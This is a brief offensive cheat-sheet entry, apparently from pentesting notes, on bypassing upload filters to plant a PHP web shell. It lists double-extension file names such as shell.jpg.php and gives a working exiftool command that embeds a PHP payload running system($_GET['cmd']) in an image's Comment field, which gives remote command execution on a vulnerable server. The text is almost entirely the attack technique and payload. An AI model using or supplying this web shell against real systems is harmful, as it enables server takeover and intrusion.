Shell bypass some case for filter
1. shell.gif.php
2. shell.jpg.php
We need embeded php code in images as:
Create malicous image file in rce.jpg by exiftool

`exiftool -Comment='<h1>PHP Shell </h1><?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg`
